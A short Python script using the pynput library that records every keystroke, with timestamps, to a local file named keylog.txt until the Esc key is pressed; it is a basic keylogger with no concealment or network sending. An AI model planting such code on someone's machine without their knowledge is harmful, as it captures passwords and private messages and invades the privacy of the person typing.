from pynput.keyboard import Key, Listener
import logging

# Set up logging configuration
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to log keystrokes
def on_press(key):
    logging.info(str(key))

# Function to handle release of keys (not used in this example)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
